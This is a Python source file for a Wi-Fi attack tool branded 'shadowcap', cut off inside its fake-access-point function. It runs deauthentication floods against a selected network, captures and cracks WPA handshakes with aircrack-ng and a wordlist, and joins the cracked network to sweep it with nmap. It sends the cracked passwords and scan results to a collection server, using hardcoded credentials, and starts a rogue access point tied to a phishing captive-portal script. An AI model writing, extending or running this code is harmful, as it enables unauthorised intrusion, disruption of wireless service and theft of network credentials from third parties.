import subprocess, time, os, re, sys, threading, random, math
import pandas as pd
import requests
from datetime import datetime
from pathlib import Path
from io import StringIO
import getpass

# ── CONFIG ─────────────────────────────────────────────────────────────────────
TARGET_INTERFACE = "wlan0"
API_BASE         = 'http://192.168.1.7:30000/api'
JWT_TOKEN        = None                                      # ← will be set after login

# ── ANSI COLOR SYSTEM ──────────────────────────────────────────────────────────
def _e(*c): return '\033[' + ';'.join(map(str, c)) + 'm'
R  = '\033[0m'

# Greens
G  = lambda s: _e(38,5,82)  + str(s) + R   # bright lime green
GB = lambda s: _e(38,5,118,1) + str(s) + R  # bold bright green
GD = lambda s: _e(38,5,22)  + str(s) + R   # dark green

# Yellows / Amber
YL = lambda s: _e(38,5,220) + str(s) + R   # amber yellow
YB = lambda s: _e(38,5,226,1) + str(s) + R # bold yellow

# Reds
RD = lambda s: _e(38,5,196) + str(s) + R   # bright red
RB = lambda s: _e(38,5,196,1) + str(s) + R # bold red

# Cyans
CY = lambda s: _e(38,5,51)  + str(s) + R   # cyan
CB = lambda s: _e(38,5,51,1)+ str(s) + R   # bold cyan

# Purples / accents
PU = lambda s: _e(38,5,135) + str(s) + R   # purple
PB = lambda s: _e(38,5,141,1) + str(s) + R # bold purple

# Dimmed / structural
DM = lambda s: _e(38,5,240) + str(s) + R   # dark grey
WH = lambda s: _e(1)        + str(s) + R   # bold white
BL = lambda s: '\033[5m'    + str(s) + R   # blink

# Status colors
OK_C  = lambda s: _e(38,5,82)  + str(s) + R
ERR_C = lambda s: _e(38,5,196) + str(s) + R
WRN_C = lambda s: _e(38,5,220) + str(s) + R
INF_C = lambda s: _e(38,5,69)  + str(s) + R

# ── TERMINAL UTILS ─────────────────────────────────────────────────────────────
def clr():       os.system('clear' if os.name != 'nt' else 'cls')
def hide_cur():  sys.stdout.write('\033[?25l'); sys.stdout.flush()
def show_cur():  sys.stdout.write('\033[?25h'); sys.stdout.flush()
def erase(n):    sys.stdout.write(f'\033[{n}A\033[J'); sys.stdout.flush()
def wr(s):       sys.stdout.write(s); sys.stdout.flush()

W = 72  # terminal working width

# ══════════════════════════════════════════════════════════════════════════════
# LOGO / HEADER
# ══════════════════════════════════════════════════════════════════════════════
LOGO = [
    r"  ╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦╔═╗╔═╗",
    r"  ╚═╗╠═╣╠═╣ ║║║ ║║║║║  ╠═╣╠═╝",
    r"  ╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝╚═╝╩ ╩╩  ",
]

VERSION_TAG = "v5.0 // wireless acquisition framework"

def _box_line(left, content, right, width=W):
    inner_w = width - 2
    stripped = re.sub(r'\033\[[0-9;]*m', '', content)
    pad = inner_w - len(stripped)
    return f'{left}{content}{" " * max(pad, 0)}{right}'

def header(sub=''):
    clr()
    ts  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    uid = 'root@shadowcap'

    print()
    print(GD(' ╔' + '═' * (W - 3) + '╗'))

    for line in LOGO:
        inner = W - 3
        stripped_len = len(line)
        pad = (inner - stripped_len) // 2
        centered = ' ' * pad + line + ' ' * (inner - stripped_len - pad)
        print(GD(' ║') + G(centered[:inner]) + GD('║'))

    print(GD(' ║') + DM(' ' * (W - 3)) + GD('║'))

    vt = VERSION_TAG
    vpad = (W - 3 - len(vt)) // 2
    print(GD(' ║') + DM(' ' * vpad + vt + ' ' * (W - 3 - len(vt) - vpad)) + GD('║'))

    print(GD(' ╠' + '─' * (W - 3) + '╣'))

    left_label  = f' {DM(uid)} {G("▸")} {GD(ts)}'
    right_label = f'{YL("⬡")} ARMED '
    l_stripped  = re.sub(r'\033\[[0-9;]*m', '', left_label)
    r_stripped  = re.sub(r'\033\[[0-9;]*m', '', right_label)
    gap = W - 3 - len(l_stripped) - len(r_stripped)
    print(GD(' ║') + left_label + ' ' * max(gap, 1) + right_label + GD('║'))

    if sub:
        sub_line = f' ╌ {CY(sub)}'
        sub_stripped = re.sub(r'\033\[[0-9;]*m', '', sub_line)
        pad = W - 3 - len(sub_stripped)
        print(GD(' ║') + sub_line + ' ' * max(pad, 0) + GD('║'))

    print(GD(' ╚' + '═' * (W - 3) + '╝'))
    print()

# ══════════════════════════════════════════════════════════════════════════════
# LOG HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def ok(s):
    tag = G('  ✔ ')
    print(f'{tag}{s}')

def warn(s):
    tag = YL('  ⚡ ')
    print(f'{tag}{WRN_C(s)}')

def err(s):
    tag = RD('  ✖ ')
    print(f'{tag}{ERR_C(s)}')

def info(s):
    tag = INF_C('  · ')
    print(f'{tag}{DM(s)}')

def section(title):
    print()
    bar = GD('─' * (W - len(re.sub(r"\033\[[0-9;]*m", "", title)) - 8))
    print(f' {GD("┌──")} {PB(title)} {bar}')
    print()

def endsection():
    print()
    print(GD(' └' + '─' * (W - 3)))
    print()

def _divider(char='─'):
    print(GD(' ' + char * (W - 2)))

# ══════════════════════════════════════════════════════════════════════════════
# API AUTH + REQUEST HELPERS
# ══════════════════════════════════════════════════════════════════════════════
BASE_DIR = Path(__file__).parent.resolve()

def login_to_api():
    global JWT_TOKEN

    section("API AUTH  ·  /users/login")

    # Hardcoded credentials as requested
    username = "asser"
    password = "1234"

    info(f"username → {CY(username)}")
    info("password → ******** (hidden)")

    payload = {
        "username": username,
        "password": password
    }

    try:
        r = requests.post(
            f'{API_BASE}/users/login',
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )

        if r.status_code in (200, 201):
            try:
                data = r.json()
                token = data.get("token") or data.get("access_token") or data.get("jwt")
                if not token:
                    err("Login ok but no token field found in JSON")
                    return False

                JWT_TOKEN = token
                ok(f'{GB("LOGIN SUCCESSFUL")}')
                info(f"token received ({len(token)} characters)")
                return True

            except Exception as e:
                err(f"JSON parse error: {str(e)}")
                return False

        else:
            try:
                msg = r.json().get("error", r.text[:120])
            except:
                msg = r.text[:120] or "(no body)"
            err(f"Login failed — {r.status_code} {msg}")
            return False

    except requests.exceptions.ConnectionError:
        err("Cannot reach API — is the server running?")
        return False
    except requests.exceptions.Timeout:
        err("Login timeout")
        return False
    except Exception as e:
        err(f"Login exception: {str(e)}")
        return False


def _post(endpoint, payload, label='request', timeout=12):
    """Send POST with JWT inside a cookie named 'token'"""
    global JWT_TOKEN

    if not JWT_TOKEN:
        err("No JWT token — login failed earlier")
        return False, {}

    # Important: send as COOKIE, not header
    cookies = {
        "token": JWT_TOKEN
    }

    headers = {
        'Content-Type': 'application/json',
        # You can keep Authorization too if backend accepts both — but probably not needed
        # 'Authorization': f'Bearer {JWT_TOKEN}',
    }

    try:
        r = requests.post(
            f'{API_BASE}/{endpoint}',
            json=payload,
            headers=headers,
            cookies=cookies,           # ← this is the key change
            timeout=timeout
        )

        if r.status_code in (200, 201):
            try:
                data = r.json()
            except:
                data = {}
            return True, data

        else:
            try:
                err_msg = r.json().get("error", r.text[:150])
            except:
                err_msg = r.text[:150] or "(no body)"
            err(f'{label} → HTTP {r.status_code}: {err_msg}')
            if r.status_code in (401, 403):
                warn("Authentication failed (401/403) — check cookie / token format")
            return False, {}

    except requests.exceptions.Timeout:
        err(f'{label} → timeout ({timeout}s)')
    except requests.exceptions.ConnectionError:
        err(f'{label} → connection refused')
    except Exception as e:
        err(f'{label} → {str(e)[:80]}')

    return False, {}


def send_to_api(networks):
    if not networks:
        warn('no networks to upload')
        return
    section('API UPLOAD  ·  scanner')
    info(f'uploading {len(networks)} networks → {API_BASE}/scanner')
    ok_flag, data = _post('scanner', networks, 'scanner upload')
    if ok_flag:
        ok(f'{GB("saved")} → {data.get("count", len(networks))} networks')
    endsection()


def send_cracked_password(bssid, password):
    section('API UPLOAD  ·  password')
    info(f'bssid    → {CY(bssid)}')
    info(f'password → {GB(password)}')
    ok_flag, data = _post('savepassword', {'bssid': bssid, 'password': password}, 'savepassword')
    if ok_flag:
        ok(f'{GB("password saved")} → {data.get("message", "updated")}')
    endsection()


def send_nmap_results(bssid, essid, hosts_data, raw_output):
    section('API UPLOAD  ·  nmap')
    info(f'target   → {CB(essid or "<hidden>")} {DM(bssid)}')
    info(f'hosts    → {len(hosts_data)} live hosts discovered')

    payload = {
        'bssid':      bssid,
        'essid':      essid or '<hidden>',
        'timestamp':  datetime.now().isoformat(),
        'host_count': len(hosts_data),
        'hosts':      hosts_data,
        'raw_output': raw_output[:4000] if raw_output else '',
    }

    ok_flag, data = _post('nmap', payload, 'nmap upload')
    if ok_flag:
        ok(f'{GB("nmap results saved")} → {data.get("message", "stored")}')
        info(f'scan id  → {data.get("id", "n/a")}')
    endsection()


# ══════════════════════════════════════════════════════════════════════════════
# AUTO-CONNECT + NMAP (updated to upload results)
# ══════════════════════════════════════════════════════════════════════════════
def connect_to_cracked_target(essid, password, bssid, channel):
    """Connect RPi to cracked target then run nmap and upload results."""
    section(f'CONNECT  ·  {CB(essid or "<hidden>")}')

    def run(cmd):
        info(f'exec → {DM(cmd)}')
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0 and result.stderr:
            warn(result.stderr.strip()[:80])
        return result

    info('stopping monitor mode...')
    run('sudo airmon-ng stop wlan1mon')
    run('sudo ip link set wlan1 down && sudo ip link set wlan1 up')

    info(f'preparing {TARGET_INTERFACE}...')
    run(f'sudo ip link set {TARGET_INTERFACE} down')
    time.sleep(1)
    run(f'sudo ip link set {TARGET_INTERFACE} up')

    info('enabling WiFi radio...')
    run('nmcli radio wifi on')
    time.sleep(2)

    info('rescanning networks...')
    run('nmcli dev wifi rescan')
    time.sleep(3)
    run(f'sudo nmcli connection delete "{essid}"')

    info(f'connecting to {CY(essid)} with key {GB(password[:2] + "***")}...')
    connect_cmd = (
        f'sudo nmcli dev wifi connect {essid} '
        f'password {password} ifname {TARGET_INTERFACE}'
    )
    result = run(connect_cmd)

    if result.returncode == 0:
        ok(f'{GB("connected")} → {CB(essid)}')
        run(f'iw dev {TARGET_INTERFACE} link')
        run(f'ip a show {TARGET_INTERFACE}')

        # ── NMAP DISCOVERY ──────────────────────────────────────────────────
        _divider()
        info(f'running nmap discovery on 192.168.1.0/24...')
        nmap_cmd = f'sudo nmap -e {TARGET_INTERFACE} -sn 192.168.1.0/24'

        nmap_result = subprocess.run(
            nmap_cmd, shell=True,
            capture_output=True, text=True, timeout=60
        )

        raw_output   = nmap_result.stdout
        hosts_parsed = []
        host_ips     = re.findall(r'Nmap scan report for ([\d.]+)', raw_output)
        host_macs    = re.findall(r'MAC Address: ([0-9A-F:]+)', raw_output)

        if host_ips:
            ok(f'{GB(f"{len(host_ips)} live hosts")} discovered')
            print()
            print(f' {DM("  #   IP ADDRESS        MAC ADDRESS        ")}')
            print(GD(' ' + '─' * 46))
            for i, ip in enumerate(host_ips, 1):
                mac = host_macs[i - 1] if i - 1 < len(host_macs) else '??:??:??:??:??:??'
                print(
                    f'  {G(f"{i:2d}")}  '
                    f'{YB(f"{ip:<16}")}  '
                    f'{DM(mac)}'
                )
                hosts_parsed.append({'ip': ip, 'mac': mac})
            print()
        else:
            warn('no live hosts found')

        # ── UPLOAD NMAP RESULTS TO /api/nmap ────────────────────────────────
        send_nmap_results(bssid, essid, hosts_parsed, raw_output)

        ok(f'{GB("target access + discovery complete")}')

    else:
        warn('connection failed — trying without ifname...')
        fallback_cmd = f'sudo nmcli dev wifi connect {essid} password {password}'
        run(fallback_cmd)

    endsection()


# ══════════════════════════════════════════════════════════════════════════════
# ASCII ANIMATIONS  (your original animations remain unchanged)
# ══════════════════════════════════════════════════════════════════════════════
_WAVE_CHARS = ' ▁▂▃▄▅▆▇█▇▆▅▄▃▂▁'
_SPIN       = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
_HEX        = '0123456789ABCDEF'

def _radar(angle_deg, blips):
    R_r = 5; CX = 12; CY_r = R_r
    rows = R_r * 2 + 1; cols = CX * 2 + 1
    g = [[' '] * cols for _ in range(rows)]
    def put(y, x, ch):
        if 0 <= y < rows and 0 <= x < cols: g[y][x] = ch
    for r in [R_r, R_r - 2]:
        for deg in range(0, 360, 4):
            rad = math.radians(deg)
            x = int(round(CX + r * 2 * math.cos(rad) * 0.55))
            y = int(round(CY_r + r * math.sin(rad)))
            put(y, x, '·')
    for x in range(cols): g[CY_r][x] = '─'
    for y in range(rows): g[y][CX]   = '│'
    g[CY_r][CX] = '┼'
    sr = math.radians(angle_deg)
    for step in range(1, R_r + 1):
        x = int(round(CX + step * 2 * math.cos(sr) * 0.55))
        y = int(round(CY_r + step * math.sin(sr)))
        if 0 <= y < rows and 0 <= x < cols:
            g[y][x] = '█' if step == R_r else '▒' if step > R_r - 2 else '░'
    for (bx, by) in blips:
        put(by, bx, '◆')
    lines = []
    for row in g:
        line = ''
        for ch in row:
            if   ch == '█': line += GB(ch)
            elif ch in ('▒','░'): line += GD(ch)
            elif ch == '◆': line += YB(ch)
            elif ch in ('─','│','┼'): line += GD(ch)
            elif ch == '·': line += DM(ch)
            else: line += ch
        lines.append('  ' + line)
    return lines

def _wave_line(tick, width=32, label=''):
    bar = ''
    for i in range(width):
        idx = (tick + i * 2) % len(_WAVE_CHARS)
        ch  = _WAVE_CHARS[idx]
        bar += (GB if idx > 10 else G if idx > 5 else GD)(ch)
    return f' {DM("[")} {bar} {DM("]")} {DM(label)}'

def pbar_tick(tick, pct, width=40, label=''):
    filled  = int(pct * width)
    empty   = width - filled
    bar     = G('█' * filled) + GD('░' * empty)
    sp      = G(_SPIN[tick % len(_SPIN)])
    pct_str = DM(f'{int(pct * 100):>3}%')
    return f' {sp} {DM("[")}{bar}{DM("]")} {pct_str}  {DM(label)}'

def _hex_stream(width=48):
    parts = []
    for _ in range(width // 3):
        h = random.choice(_HEX) + random.choice(_HEX)
        if   random.random() > 0.7: parts.append(GB(h))
        elif random.random() > 0.4: parts.append(G(h))
        else: parts.append(GD(h))
        parts.append(DM(' '))
    return '  ' + ''.join(parts)

_DEAUTH_FRAMES = [
    [' ╔══════╗             ╔════════╗',
     ' ║  AP  ║────────────▶║ CLIENT ║',
     ' ╚══════╝    DATA     ╚════════╝'],
    [' ╔══════╗             ╔════════╗',
     ' ║  AP  ║────  !!  ──▶║ CLIENT ║',
     ' ╚══════╝   DEAUTH    ╚════════╝'],
    [' ╔══════╗             ╔════════╗',
     ' ║  AP  ║──── ✦✦ ────▶║ CLIENT ║',
     ' ╚══════╝   KICKED    ╚════════╝'],
    [' ╔══════╗             ╔════════╗',
     ' ║  AP  ║ ×  ×  ×  × ║ CLIENT ║',
     ' ╚══════╝  FLOODING   ╚════════╝'],
    [' ╔══════╗             ╔════════╗',
     ' ║  AP  ║────────────▶║ CLIENT ║',
     ' ╚══════╝  RECONNECT  ╚════════╝'],
]

def _deauth_frame(tick):
    frame = _DEAUTH_FRAMES[tick % len(_DEAUTH_FRAMES)]
    lines = []
    for i, line in enumerate(frame):
        if i == 1:
            colored = (line
                .replace('AP',      GB('AP'))
                .replace('CLIENT',  YB('CLIENT'))
                .replace('!!',      RB('!!'))
                .replace('✦✦',     RB('✦✦'))
                .replace('×',       RD('×')))
            lines.append(colored)
        else:
            lines.append(DM(line
                .replace('AP',     'AP')
                .replace('CLIENT', 'CLIENT')))
    return lines

_EAPOL = [
    'MSG 1/4 → ANonce',
    'MSG 2/4 ← SNonce + MIC',
    'MSG 3/4 → GTK encrypted',
    'MSG 4/4 ← ACK  ✓  handshake complete',
]

def _eapol_lines(progress):
    lines = []
    for i, stage in enumerate(_EAPOL):
        if   i < progress:  lines.append(f'  {G("✔")} {GD(stage)}')
        elif i == progress:  lines.append(f'  {YL("▶")} {YL(stage)}')
        else:                lines.append(f'  {DM("○")} {DM(stage)}')
    return lines

class Anim:
    def __init__(self, style='spin', msg='', duration=None):
        self.style    = style
        self.msg      = msg
        self.duration = duration
        self._stop    = threading.Event()
        self._t       = None
        self._h       = 0
        self._blips   = [(8,1),(16,3),(4,6),(20,7),(14,8)]

    def _draw(self, lines):
        if self._h: erase(self._h)
        for line in lines: print(line)
        self._h = len(lines)
        sys.stdout.flush()

    def _frame_radar(self, tick):
        angle = (tick * 15) % 360
        radar = _radar(angle, self._blips)
        pct   = (tick * 0.012) % 1.0
        return [''] + radar + ['', pbar_tick(tick, pct, label='passive capture'), '', _hex_stream(48), '']

    def _frame_deauth(self, tick):
        pct = min(tick * 0.025, 1.0)
        return ([''] + _deauth_frame(tick // 4) + ['',
            _wave_line(tick, 30, 'jamming frames'), '',
            pbar_tick(tick, pct, label=self.msg), ''])

    def _frame_handshake(self, tick):
        progress = min(tick // 20, 4)
        pct      = min(tick / 80, 1.0)
        return ([''] + _eapol_lines(progress) + ['',
            pbar_tick(tick, pct, label='hunting handshake'),
            '', _hex_stream(40), ''])

    def _frame_spin(self, tick):
        sp = G(_SPIN[tick % len(_SPIN)])
        return [f'  {sp}  {DM(self.msg)}']

    def _loop(self):
        hide_cur()
        tick  = 0
        start = time.time()
        render = {
            'radar':      self._frame_radar,
            'deauth':     self._frame_deauth,
            'handshake':  self._frame_handshake,
            'spin':       self._frame_spin,
        }.get(self.style, self._frame_spin)
        while not self._stop.is_set():
            if self.duration and time.time() - start >= self.duration: break
            self._draw(render(tick))
            tick += 1
            time.sleep(0.12)
        if self._h: erase(self._h); self._h = 0
        show_cur()

    def start(self):
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self._stop.set()
        if self._t: self._t.join(timeout=2)

    def run(self):
        self.start()
        try:
            if self.duration: time.sleep(self.duration + 0.3)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

def pbar_blocking(label, duration, width=40):
    hide_cur()
    start = time.time(); tick = 0
    while True:
        pct  = min((time.time() - start) / duration, 1.0)
        wr(f'\r{pbar_tick(tick, pct, width, label)}')
        tick += 1
        if pct >= 1.0: break
        time.sleep(0.08)
    print(); show_cur()

# ══════════════════════════════════════════════════════════════════════════════
# PASSWORD CRACKING (AUTO-CONNECTS AFTER CRACK)
# ══════════════════════════════════════════════════════════════════════════════
def crack_password(cap_path, bssid, essid):
    wordlist_path = BASE_DIR / 'test.txt'
    if not wordlist_path.exists():
        warn(f'wordlist missing → {wordlist_path}')
        info('create test.txt with passwords to test locally')
        return False

    section('CRACK  ·  aircrack-ng')
    info(f'capture  → {cap_path.name}')
    info(f'wordlist → {wordlist_path.name}  ({wordlist_path.stat().st_size/1024:.1f} KB)')
    info(f'target   → {CB(essid or "<hidden>")}  {DM(bssid)}')
    print()

    try:
        cmd = [
            'aircrack-ng',
            '-w', str(wordlist_path),
            '-e', essid or '',
            '-b', bssid,
            str(cap_path)
        ]
        info(f'cmd → {" ".join(cmd)}')
        print()

        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, universal_newlines=True
        )

        cracked  = False
        password = None
        start_t  = time.time()

        while proc.poll() is None and (time.time() - start_t) < 45:
            line = proc.stdout.readline()
            if line:
                print(f'  {DM(line.strip())}')
                sys.stdout.flush()
                patterns = [
                    r'KEY FOUND! \[ ([^\]]+) \]',
                    r'password: ([^\s]+)',
                    r'\[ ([^\]]+) \]',
                    r'cracked: ([^\s]+)',
                ]
                for pattern in patterns:
                    m = re.search(pattern, line, re.IGNORECASE)
                    if m:
                        password = m.group(1).strip()
                        cracked  = True
                        print()
                        print(GD(' ' + '─' * 50))
                        ok(GB('PASSWORD CRACKED'))
                        print(f'  {DM("password")} {G("→")} {GB(password)}')
                        print(f'  {DM("network")}  {G("→")} {CB(essid or "<hidden>")}')
                        print(f'  {DM("bssid")}    {G("→")} {DM(bssid)}')
                        print(GD(' ' + '─' * 50))
                        break
                if cracked:
                    break

        if cracked and password:
            send_cracked_password(bssid, password)
            connect_to_cracked_target(essid or '<hidden>', password, bssid, None)

        try:
            if proc.poll() is None:
                proc.terminate(); proc.wait(timeout=3)
        except:
            try: proc.kill()
            except: pass

        if not cracked:
            warn('no password found in wordlist')
            try:
                info(f'test.txt lines → {sum(1 for _ in open(wordlist_path))}')
            except: pass
            info('add target password to test.txt and retry')

        endsection()
        return cracked

    except FileNotFoundError:
        err('aircrack-ng not found → sudo apt install aircrack-ng')
    except Exception as e:
        err(f'cracking failed: {str(e)[:60]}')
        endsection()
        return False

# ══════════════════════════════════════════════════════════════════════════════
# CORE LOGIC
# ══════════════════════════════════════════════════════════════════════════════
def prepare_monitor(iface='wlan1'):
    section('INTERFACE')
    info(f'checking {iface}...')
    try:
        r = subprocess.run(['iw', iface, 'info'], capture_output=True, text=True, timeout=4)
        if 'type monitor' in r.stdout.lower():
            ok(f'monitor active → {CY(iface)}'); endsection(); return iface
    except Exception: pass
    mon = f'{iface}mon' if not iface.endswith('mon') else iface
    warn(f'enabling monitor → {mon}')
    anim = Anim('spin', f'airmon-ng start {iface}')
    anim.start()
    try:
        subprocess.run(['airmon-ng', 'start', iface], check=True, capture_output=True, timeout=15)
        time.sleep(1.5); anim.stop()
        ok(f'monitor ready → {CY(mon)}'); endsection(); return mon
    except Exception as e:
        anim.stop(); err(str(e))
        input(f'\n {YL("press enter to continue...")}')
        return iface

def lock_channel(iface, ch):
    if not ch or str(ch).strip() in ('-', '', 'None'):
        warn('channel unknown'); return False
    info(f'locking channel → {ch}')
    try:
        subprocess.run(['iw', 'dev', iface, 'set', 'channel', str(ch)], check=True, timeout=5)
        time.sleep(0.5); ok(f'channel {ch} locked'); return True
    except Exception as e:
        err(str(e)); return False

def do_scan(iface='wlan1', duration=25):
    section('PASSIVE SCAN')
    mon = prepare_monitor(iface)
    if not mon: return None
    ts     = datetime.now().strftime('%Y%m%d-%H%M%S')
    prefix = BASE_DIR / f'scan_{ts}'
    info(f'interface → {CY(mon)}')
    info(f'duration  → {duration}s')
    info(f'output    → {prefix.name}-*.csv')
    print()
    proc = subprocess.Popen(
        ['airodump-ng', mon, '--output-format', 'csv', '-w', str(prefix)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    anim = Anim('radar', 'passive scan', duration=duration)
    anim.run()
    try:   proc.terminate(); proc.wait(timeout=5)
    except: proc.kill()
    files = sorted(
        BASE_DIR.glob(f'scan_{ts}-*.csv'),
        key=lambda p: p.stat().st_mtime, reverse=True
    )
    if files:
        ok(f'saved → {GD(files[0].name)}')
        networks = parse_networks(files[0])
        send_to_api(networks)
        endsection(); return files[0]
    err('no capture generated'); endsection(); return None

def parse_networks(path):
    if not path or not path.exists(): return []
    try:
        with open(path, encoding='utf-8', errors='replace') as f:
            raw = f.read()
        block = re.split(r'(?i)(Station MAC,.*)', raw)[0].strip()
        df = pd.read_csv(StringIO(block), on_bad_lines='skip')
        df.columns = df.columns.str.strip()
        df = df.dropna(subset=['BSSID'])
        df['Power'] = pd.to_numeric(df['Power'], errors='coerce')
        df = df.sort_values('Power', ascending=False)
        networks = []
        for _, row in df.iterrows():
            net = {
                'ESSID':   row.get('ESSID', None),
                'BSSID':   str(row['BSSID']).strip(),
                'Power':   int(row['Power']) if pd.notna(row['Power']) else None,
                'Privacy': row.get('Privacy', 'Unknown'),
                'channel': int(row.get('channel', 0)) if pd.notna(row.get('channel')) else 0,
                'essid':   row.get('ESSID', None),
                'bssid':   str(row['BSSID']).strip(),
                'pwr':     int(row['Power']) if pd.notna(row['Power']) else -100,
                'enc':     row.get('Privacy', 'Unknown'),
            }
            networks.append(net)
        return networks
    except Exception as e:
        err(f'parse error: {str(e)[:40]}'); return []

def pick_target(aps):
    if not aps:
        err('no targets available'); return None

    strong_aps = [
        ap for ap in aps
        if (lambda v: isinstance(v, (int,float)) and v >= -70)(
            ap.get('Power') or ap.get('pwr')
        )
    ]

    if not strong_aps:
        warn('no networks ≥ -70 dBm found'); return None

    print()
    print(f'  {DM("strong signals (≥ -70 dBm)")}  {G(str(len(strong_aps)))} {DM("found")}')
    print()
    print(f'  {DM("  #   BSSID              PWR      CH   ESSID")}')
    print(GD('  ' + '─' * 58))

    for i, ap in enumerate(strong_aps, 1):
        pwr   = ap.get('Power') or ap.get('pwr', '?')
        pwr_s = f'{pwr} dBm' if isinstance(pwr, (int, float)) else '?'
        ch    = ap.get('channel', '?')
        essid = (ap.get('ESSID') or ap.get('essid') or '<hidden>')[:22]
        bssid = ap.get('BSSID') or ap.get('bssid', '??:??:??:??:??:??')
        try:
            bar_len = max(0, min(8, (int(pwr) + 100) // 5))
            sig_bar = G('█' * bar_len) + GD('░' * (8 - bar_len))
        except: sig_bar = DM('?' * 8)

        print(f'  {G(f"{i:2d}")}  {DM(bssid)}  {sig_bar}  {DM(f"ch{ch:<2}")}  {CY(essid)}')

    print()
    try:
        idx = input(f'  {DM("target")} {G("▸")} ').strip()
        i   = int(idx) - 1
        if 0 <= i < len(strong_aps): return strong_aps[i]
    except: pass
    return None

# ══════════════════════════════════════════════════════════════════════════════
# HANDSHAKE EXTRACTION + API
# ══════════════════════════════════════════════════════════════════════════════
def extract_and_upload_handshake(cap_path, bssid, essid, channel):
    section('HANDSHAKE EXTRACT  ·  hcxpcapngtool')
    if not cap_path.exists():
        err('capture file missing'); endsection(); return False

    info(f'source → {cap_path.name}')
    info(f'target → {CB(essid or "<hidden>")}  {DM(bssid)}')
    hash_file = cap_path.with_suffix('.hc22000')

    try:
        cmd  = ['hcxpcapngtool', '-o', str(hash_file), str(cap_path)]
        anim = Anim('spin', 'hcxpcapngtool extraction...')
        anim.start()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
        anim.stop()

        if result.returncode != 0:
            err(f'extraction failed: {result.stderr.strip()[:120]}')
            endsection(); return False
        if not hash_file.exists() or hash_file.stat().st_size == 0:
            err('no handshake found in capture'); endsection(); return False

        with open(hash_file, 'r', encoding='utf-8', errors='ignore') as f:
            hash_content = f.read().strip()
        if not hash_content:
            err('empty hash file'); endsection(); return False

        first_hash = hash_content.split('\n')[0].strip()
        if not first_hash:
            err('no valid hash'); endsection(); return False

        ok(f'{GB("handshake extracted")} → {len(first_hash)} chars')
        info(f'preview → {first_hash[:56]}...')
        try: hash_file.unlink()
        except: pass
        endsection(); return True

    except subprocess.TimeoutExpired:
        err('extraction timeout')
    except FileNotFoundError:
        err('hcxpcapngtool not found → sudo apt install hcxtools')
    except Exception as e:
        err(f'unexpected: {str(e)[:60]}')

    endsection(); return False

def check_hs(cap, bssid=None, essid=None, channel=None):
    section('HANDSHAKE VERIFY  ·  aircrack-ng')
    if not cap.exists():
        err('capture file missing'); endsection(); return False

    info(f'analyzing → {cap.name}')
    anim = Anim('spin', 'analyzing capture...')
    anim.start()
    try:
        r   = subprocess.run(['aircrack-ng', str(cap)], capture_output=True, text=True, timeout=12)
        anim.stop()
        out = (r.stdout + r.stderr).lower()

        if '1 handshake' in out or 'handshake found' in out:
            ok(GB('handshake confirmed'))
            extract_and_upload_handshake(cap, bssid, essid, channel)
            crack_password(cap, bssid, essid)
            endsection(); return True

        if 'no valid wpa' in out or '0 handshake' in out:
            err('no handshake'); endsection(); return False

        warn('aircrack ambiguous → trying hcxpcapngtool...')
        if extract_and_upload_handshake(cap, bssid, essid, channel):
            crack_password(cap, bssid, essid)
        endsection(); return False

    except Exception as e:
        anim.stop(); err(str(e)); endsection(); return False

def do_capture_deauth(mon, bssid, channel, essid):
    section('CAPTURE + DEAUTH')
    lock_channel(mon, channel)
    safe  = (essid or 'unknown').replace(' ', '_').replace('/', '')[:14]
    ts    = datetime.now().strftime('%Y%m%d-%H%M%S')
    pfx   = BASE_DIR / f'hs_{safe}_{bssid.replace(":","")[:8]}_{ts}'
    info(f'target   → {CB(essid or "<hidden>")}  {DM(bssid)}')
    info(f'channel  → {channel or "auto"}')
    info(f'output   → {DM(pfx.name + "-01.cap")}')
    print()
    cap_cmd = [x for x in [
        'airodump-ng', mon, '--bssid', bssid,
        '-c', str(channel) if channel else '', '-w', str(pfx)
    ] if x]
    dth_cmd = ['aireplay-ng', '--deauth', '120', '-a', bssid, mon]
    cap_p   = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    dth_p   = subprocess.Popen(dth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    anim    = Anim('deauth', f'deauth {bssid}', duration=25)
    anim.run()
    ok('deauth burst complete')
    try:   dth_p.terminate(); dth_p.wait(timeout=5)
    except: dth_p.kill()
    print()
    anim2 = Anim('handshake', '', duration=15)
    anim2.run()
    try:   cap_p.terminate(); cap_p.wait(timeout=6)
    except: cap_p.kill()
    caps = list(BASE_DIR.glob(f'{pfx.stem}-01.cap'))
    if not caps:
        err('no capture generated'); endsection(); return
    ok(f'saved → {GD(caps[0].name)}')
    check_hs(caps[0], bssid, essid, channel)
    endsection()

def do_deauth_only(mon, bssid, channel):
    section('DEAUTH')
    lock_channel(mon, channel)
    info(f'aireplay-ng --deauth 120 -a {bssid} {mon}')
    print()
    proc = subprocess.Popen(
        ['aireplay-ng', '--deauth', '120', '-a', bssid, mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    anim = Anim('deauth', f'deauth {bssid}', duration=25)
    anim.run()
    try:   proc.terminate(); proc.wait(timeout=5)
    except: proc.kill()
    ok('deauth complete'); endsection()

# ══════════════════════════════════════════════════════════════════════════════
# FAKE ACCESS POINT
# ══════════════════════════════════════════════════════════════════════════════
def do_fake_ap(mon, essid='FreeWiFi', channel=6,
               portal_script='/home/kali/Desktop/captiveportals/google_server.py'):
    section(f'FAKE AP  ·  {CY(essid)}  ch{channel}')

    airbase_p = dnsmasq_p = server_p = None
    reset_cmds = [
        ['iptables', '--flush'],
        ['iptables', '-t', 'nat', '--flush'],
        ['iptables', '--delete-chain'],
        ['iptables', '-t', 'nat', '--delete-chain'],
    ]

    def run(cmd):
        result = subprocess.run(cmd, check=True, timeout=8,
